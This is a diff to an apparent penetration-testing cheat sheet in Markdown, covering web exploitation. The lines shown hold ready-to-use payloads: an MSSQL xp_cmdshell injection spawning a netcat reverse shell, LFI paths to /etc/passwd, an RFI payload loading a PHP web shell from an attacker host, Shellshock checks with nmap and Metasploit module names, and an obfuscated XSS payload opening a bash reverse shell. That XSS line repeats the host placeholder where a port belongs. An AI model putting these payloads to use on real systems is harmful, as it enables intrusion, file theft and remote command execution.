@@ -287,7 +287,42 @@ Web Exploitation
          ' EXEC xp_cmdshell "nc.exe -e cmd.exe <LHOST> <LPORT>";--
          
 `LFI/RFI`
+
+-    Linux Path  
+     `../../../../../../../../etc/passwd`
+ 
+-    Windows Path  
+     `c:\windows\system32\drivers\etc\hosts`
+         
+-    RFI  
+     `http://<LHOST:80>/p0wny_shell.php`
      
-         ../../../../../../../../etc/passwd
-         c:\windows\system32\drivers\etc\hosts
-         http://<LHOST:80>/p0wny_shell.php
+-    Wordlists  
+
+         /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+         /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
+         
+`CGI-BIN`
+
+-    Popular Extensions: .sh & .pl  
+
+-    Nmap Check  
+     `nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/<vulnerable file>,cmd=ls <RHOST>`
+     
+-    MSF Check  
+     `auxiliary/scanner/http/apache_mod_cgi_bash_env`
+     
+-    MSF Exploit  
+     `exploit/multi/http/apache_mod_cgi_bash_env_exec`
+
+`XSS`
+
+-    Test  
+     `test: <img src=http://<lhost>/<lport>)>`
+     
+-    Reverse Shell
+     `<img src=http://<lhost>/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<LHOST>'$IFS'<LHOST>')>`
+     
+-    [SSTI - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+
+-    ![alt text](https://imgur.com/a/4Gdm454)
